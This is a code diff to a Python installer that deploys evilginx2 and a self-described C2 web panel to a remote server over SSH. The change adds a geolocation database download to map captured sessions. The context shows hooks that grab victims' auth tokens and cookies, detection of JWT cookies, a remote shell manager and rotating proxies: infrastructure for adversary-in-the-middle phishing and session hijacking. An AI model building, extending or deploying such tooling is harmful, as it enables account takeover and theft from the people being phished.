@@ -17,6 +17,7 @@ import shlex
 import threading
 import traceback
 import webbrowser
+from datetime import datetime, timezone
 
 # ── bootstrap paramiko ────────────────────────────────────────────────────────
 def _ensure_paramiko():
@@ -40,7 +41,7 @@ if getattr(sys, "frozen", False) and hasattr(sys, "_MEIPASS"):
     HERE = sys._MEIPASS
 PAYLOAD = os.path.join(HERE, "payload")
 PANEL_PORT = 8443
-PANEL_BUILD = "3.5.2"  # keep in sync with payload/app.py PANEL_VERSION
+PANEL_BUILD = "3.5.3"  # keep in sync with payload/app.py PANEL_VERSION
 GO_VER = "1.20"
 REMOTE_HOME_DEFAULT = "/root"
 REMOTE_EGX = "/root/evilginx2"
@@ -296,7 +297,7 @@ class Installer:
         self.log("[*] Python virtualenv + pip packages")
         req = (
             "flask flask-socketio simple-websocket pyyaml "
-            "requests mysql-connector-python"
+            "requests mysql-connector-python maxminddb"
         )
         self.ssh.run(f"mkdir -p {REMOTE_PANEL}")
         venv = self.venv
@@ -364,7 +365,7 @@ class Installer:
         except Exception as e:
             self.log(f"[!] apt python libs: {e}")
         for pip, fl in [("python3 -m pip", "--break-system-packages"), ("pip3", "--break-system-packages")]:
-            if self.ssh.ok(f"{pip} install flask-socketio simple-websocket mysql-connector-python {fl}", timeout=300):
+            if self.ssh.ok(f"{pip} install flask-socketio simple-websocket mysql-connector-python maxminddb {fl}", timeout=300):
                 self.venv = ""
                 self.log("[+] mixed apt+pip packages OK")
                 return
@@ -492,6 +493,46 @@ class Installer:
                 self.apt_install(["make", "build-essential", "gcc"], "make/gcc retry")
         raise RuntimeError("evilginx make/build failed\n" + last[-2000:])
 
+    def install_geo_db(self):
+        """DB-IP City Lite for Session Map. No live geo HTTP API."""
+        self.log("[*] Session Map geo database (DB-IP City Lite)")
+        remote_geo = f"{REMOTE_PANEL}/geo"
+        remote_mmdb = f"{remote_geo}/dbip-city-lite.mmdb"
+        self.ssh.mkdir_p(remote_geo)
+        local_mmdb = os.path.join(PAYLOAD, "geo", "dbip-city-lite.mmdb")
+        local_gz = os.path.join(PAYLOAD, "geo", "dbip-city-lite.mmdb.gz")
+        if os.path.isfile(local_mmdb):
+            self.ssh.put_file(local_mmdb, remote_mmdb)
+            self.log("[+] uploaded local dbip-city-lite.mmdb")
+            return
+        if os.path.isfile(local_gz):
+            self.ssh.put_file(local_gz, f"{remote_geo}/dbip-city-lite.mmdb.gz")
+            if self.ssh.ok(f"gzip -df {remote_geo}/dbip-city-lite.mmdb.gz && test -s {remote_mmdb}", timeout=120):
+                self.log("[+] unpacked local dbip-city-lite.mmdb.gz")
+                return
+        now = datetime.now(timezone.utc)
+        y, m = now.year, now.month
+        months = []
+        for _ in range(3):
+            months.append(f"{y:04d}-{m:02d}")
+            m -= 1
+            if m == 0:
+                m, y = 12, y - 1
+        ua = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/128.0.0.0 Safari/537.36"
+        for ym in months:
+            url = f"https://download.db-ip.com/free/dbip-city-lite-{ym}.mmdb.gz"
+            self.log(f"    download {ym}")
+            cmd = (
+                f'curl -L -A "{ua}" --fail --max-time 180 '
+                f'-o {remote_geo}/dbip-city-lite.mmdb.gz "{url}" '
+                f"&& gzip -df {remote_geo}/dbip-city-lite.mmdb.gz "
+                f"&& test -s {remote_mmdb}"
+            )
+            if self.ssh.ok(cmd, timeout=200):
+                self.log(f"[+] DB-IP City Lite {ym}")
+                return
+        self.log("[!] geo DB download failed — Session Map will show IPs without coordinates")
+
     def deploy_panel(self):
         self.set_pct(80)
         self.log(f"[*] Uploading C2 web panel v{PANEL_BUILD}")
@@ -515,7 +556,7 @@ class Installer:
         hook_py = os.path.join(PAYLOAD, "patches", "apply_egx_429_hook.py")
         required_marks = {
             hook_py: ["egx-429", "StatusCode == 429", "auth_tokens = pl.cookieAuthTokens"],
-            os.path.join(PAYLOAD, "app.py"): ["def api_sessions_clear", "def api_fs_list", "def api_service_create", "def favicon", "def _cookie_looks_like_jwt", "class ShellManager", "class JournalFollower", "def api_health", "def api_proxy_key", "import proxy_engine", "def api_proxy_carousel", "def _proxy_live_loop", "def _parse_exec_start", "PYTHONUNBUFFERED"],
+            os.path.join(PAYLOAD, "app.py"): ["def api_sessions_clear", "def api_fs_list", "def api_service_create", "def favicon", "def _cookie_looks_like_jwt", "class ShellManager", "class JournalFollower", "def api_health", "def api_proxy_key", "import proxy_engine", "def api_proxy_carousel", "def _proxy_live_loop", "def _parse_exec_start", "PYTHONUNBUFFERED", "def api_dashboard_map", "_geo_lookup"],
             os.path.join(PAYLOAD, "proxy_engine.py"): [
                 "def deploy_async", "class _Sidecar", "def record_auth_429", "def repair_instance",
                 "def _install_squid", "def detach", "def drop_proxy_tunnels", "def _wait_guest_ready", "def _repair_install",
@@ -528,6 +569,7 @@ class Installer:
                 "page-proxy", "nc-panel", "loadProxy", "ncBadge",
                 "pxRegionSearch", "pxDeployProgress", "--text3:#e2e8f0", "_pxIpLab",
                 "pxCarouselBtn", "proxy_live", "svcShow", "svcModify", "fa-toggle-on", "Show service file",
+                "Session Map", "dashClickPoint", "dash-z-reset",
             ],
             os.path.join(PAYLOAD, "templates", "login.html"): [
                 "/static/logo.png", "favicon-32.png", "logo-mark", "ZynTarvo",
@@ -555,6 +597,7 @@ class Installer:
             self.log(f"    {os.path.basename(loc)}  {os.path.getsize(loc)} bytes")
             self.ssh.put_file(loc, rem)
         self.ssh.run(f"chmod +x {REMOTE_PANEL}/app.py")
+        self.install_geo_db()
 
         # panel env (login = SSH login/password)
         pass_esc = self.password.replace("\\", "\\\\").replace('"', '\\"')
